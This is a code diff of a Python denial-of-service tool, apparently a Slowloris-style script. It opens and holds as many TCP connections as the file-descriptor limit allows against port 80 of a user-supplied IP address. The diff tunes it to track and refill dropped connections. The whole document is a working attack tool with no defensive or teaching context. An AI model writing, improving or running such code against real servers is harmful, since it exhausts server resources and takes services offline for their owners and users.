@@ -5,21 +5,24 @@ import time
 import subprocess
 
 class SlowL:
-	def __init__(self, ip, port):
+	def __init__(self, ip, port, maxt):
 		self.ip = socket.gethostbyname(ip)
 		self.port = port
+		self.open = 0
 		while True:
-			if threading.active_count() < int(subprocess.check_output(["ulimit", "-n"])) - 10:
+			if self.open < maxt:
 				t = threading.Thread(target=self.handler)
 				t.daemon = True
 				t.start()
-			print("Open count: " + str(threading.active_count()))
+				self.open += 1
+			print("Open count: " + str(self.open) + " - " + "Active thread count: " + str(threading.active_count()))
 
 	def handler(self):
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		try:
 			sock.connect((self.ip, self.port))
 		except:
+			self.open -= 1
 			return
 		while True:
 			try:
@@ -27,8 +30,10 @@ class SlowL:
 				sock.recv(1024)
 			except:
 				sock.close()
+				self.open -= 1
 				break
 
 if __name__ == '__main__':
 	ips = input("IP NOW: ")
-	s = SlowL(ips, 80)
+	mat = int(subprocess.check_output(["ulimit", "-n"]))
+	s = SlowL(ips, 80, mat)
